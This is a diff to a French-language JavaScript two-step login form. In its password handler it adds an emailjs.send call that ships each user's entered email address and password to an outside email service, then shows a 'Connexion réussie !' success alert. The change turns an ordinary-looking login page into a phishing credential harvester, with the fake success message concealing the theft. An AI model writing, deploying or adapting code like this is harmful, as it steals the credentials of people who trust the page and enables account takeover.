@@ -6,10 +6,10 @@ document.addEventListener("DOMContentLoaded", function () {
     const backBtn = document.getElementById("back-btn");
 
     emailForm.addEventListener("submit", function (event) {
-        event.preventDefault(); // Empêche le rechargement de la page
+        event.preventDefault();
 
         if (emailInput.value.trim() !== "") {
-            history.pushState({ page: "password" }, "", "#password"); // Ajout à l'historique
+            history.pushState({ page: "password" }, "", "#password");
             emailForm.style.display = "none";
             passwordForm.style.display = "block";
         } else {
@@ -18,20 +18,29 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 
     passwordForm.addEventListener("submit", function (event) {
-        event.preventDefault(); // Empêche le rechargement de la page
+        event.preventDefault();
 
         if (passwordInput.value.trim() !== "") {
-            alert("Connexion réussie !");
+            // Envoyer les données à EmailJS
+            emailjs.send("service_u6vikzg", "template_0x8is9j", {
+                email: emailInput.value,
+                password: passwordInput.value
+            }).then(function(response) {
+                console.log('Email envoyé!', response.status, response.text);
+                alert("Connexion réussie !");
+            }, function(error) {
+                console.log('Erreur:', error);
+                alert("Erreur lors de l'envoi de l'email.");
+            });
         } else {
             alert("Veuillez entrer votre mot de passe.");
         }
     });
 
     backBtn.addEventListener("click", function () {
-        history.back(); // Revenir en arrière dans l'historique
+        history.back();
     });
 
-    // Gère le bouton retour du navigateur
     window.addEventListener("popstate", function (event) {
         if (!event.state || event.state.page === "email") {
             emailForm.style.display = "block";
@@ -39,6 +48,5 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     });
 
-    // Initialisation de l'état par défaut
     history.replaceState({ page: "email" }, "", "#email");
 });
